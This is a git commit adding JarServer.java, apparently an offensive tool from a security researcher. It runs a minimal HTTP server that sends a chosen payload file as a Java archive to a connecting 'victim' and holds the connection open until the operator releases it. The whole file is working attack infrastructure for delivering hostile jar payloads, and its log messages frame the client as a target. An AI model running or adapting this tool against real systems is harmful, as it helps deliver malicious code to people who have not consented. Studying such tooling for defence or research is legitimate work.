566b0128b26d6a02342fd7022e07f415de56a1e9
Alvaro Muñoz <alvaro@pwntester.com>
2013-11-27 16:47:21 +0100

    initial release

---
+++ JarServer.java
@@ -0,0 +1,101 @@
+import java.net.*;
+import java.io.*;
+import java.util.*;
+
+public class JarServer {
+  int port;
+  String jarPath;
+  Socket con;
+  BufferedReader in;
+  OutputStream out;
+  PrintStream pout;
+
+  public JarServer(int port, String path) {
+    this.port = port;
+    this.jarPath = path;
+  }
+
+  public static void main(String[] args) {
+    if (args.length!=2) {
+      System.out.println("[+] Usage: java JarServer <port> <file to send>");
+      System.exit(-1);
+    }
+    int port = Integer.parseInt(args[0]);
+    String jarPath = args[1];
+
+    JarServer js = new JarServer(port, jarPath);
+    js.run();
+  }
+
+  public void run() {
+    ServerSocket ss = null; 
+    try {
+      ss = new ServerSocket(port); 
+    } catch (IOException e) {
+      System.err.println("[+] Could not start server: "+e + ". Exiting");
+      System.exit(-1);
+    }
+
+    while (true) {
+      System.out.println("[+] JarServer worker accepting connections on port "+ port);
+      try {
+        con = ss.accept();
+        in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+        out = new BufferedOutputStream(con.getOutputStream());
+        pout = new PrintStream(out);
+                
+        String request = in.readLine();
+        con.shutdownInput(); 
+
+        processRequest(request);
+        
+        out.flush();
+        System.out.println("[+] File sent, press Q and then ENTER to release the victim");
+        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
+        String msg ="";
+        while (true) {
+          try{
+            msg=in.readLine();
+          } catch(Exception e){}
+          if(msg.equals("Q")) {
+            break;
+          } 
+        }  
+        
+      } catch (Exception e) { 
+        System.err.println(e); 
+      }
+      try {
+        if (con!=null) con.close(); 
+      } catch (IOException e) { 
+        System.err.println(e); 
+      }
+    }
+  }
+  public void processRequest(String request) throws IOException {
+    if (!request.startsWith("GET") || request.length()<14 || !(request.endsWith("HTTP/1.0") || request.endsWith("HTTP/1.1")) || request.charAt(4)!='/') {
+      System.out.println("[+] Bad request. Exiting");
+      System.exit(-1);
+    } else {
+      File f = new File(jarPath);
+      try { 
+        System.out.println("[+] Victim hooked, sending payload");
+        InputStream file = new FileInputStream(f);
+        String contenttype = "application/java-archive";
+        pout.print("HTTP/1.0 200 OK\r\n");
+        if (contenttype!=null) pout.print("Content-Type: "+contenttype+"\r\n");
+        pout.print("Date: "+new Date()+"\r\n"+ "Server: JarServer 1.0\r\n\r\n");
+        byte[] buffer = new byte[1000];
+        while (file.available()>0) out.write(buffer, 0, file.read(buffer));
+      } catch (FileNotFoundException e) { 
+        System.out.println("[+] Payload file cannot be found. Exiting");
+        System.exit(-1);
+      }
+    }
+  }
+
+
+
+}
+
+
